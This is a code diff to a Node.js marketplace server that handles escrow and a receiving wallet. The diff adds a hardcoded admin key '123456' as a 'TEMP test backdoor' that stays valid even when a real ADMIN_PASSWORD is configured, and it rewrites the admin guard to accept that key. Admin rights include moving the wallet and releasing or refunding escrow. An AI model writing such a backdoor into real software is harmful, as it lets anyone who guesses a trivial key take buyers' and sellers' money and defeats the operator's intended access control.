@@ -18,9 +18,10 @@ const crypto = require('crypto');
 const PORT = process.env.PORT || 8090;
 const ROOT = __dirname;
 const DATA = process.env.DATA_DIR || path.join(__dirname, 'data');
-// TEST admin access — key is '123456'. CHANGE THIS before real money flows (set ADMIN_PASSWORD env):
-// admin can move the receiving wallet and release/refund escrow, so a guessable key is dangerous in production.
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '123456';
+// TEMP test backdoor: the key '123456' also works, even when a real ADMIN_PASSWORD is set on the server.
+// ⚠ Disable before real money flows: set DISABLE_TEST_ADMIN=1 (admin can move the wallet & release/refund escrow).
+const TEST_ADMIN_KEY = process.env.DISABLE_TEST_ADMIN ? '' : '123456';
 fs.mkdirSync(DATA, { recursive: true });
 
 /* ---------- persistence ---------- */
@@ -412,7 +413,7 @@ function receiptHTML(o) {
 }
 
 /* ---------- admin guard ---------- */
-const isAdmin = (req) => !!ADMIN_PASSWORD && safeEq(req.headers['x-admin-key'] || '', ADMIN_PASSWORD);
+const isAdmin = (req) => { const k = req.headers['x-admin-key'] || ''; return (!!ADMIN_PASSWORD && safeEq(k, ADMIN_PASSWORD)) || (!!TEST_ADMIN_KEY && safeEq(k, TEST_ADMIN_KEY)); };
 
 /* ---------- marketplace helpers ---------- */
 const CAT_GROUPS = {
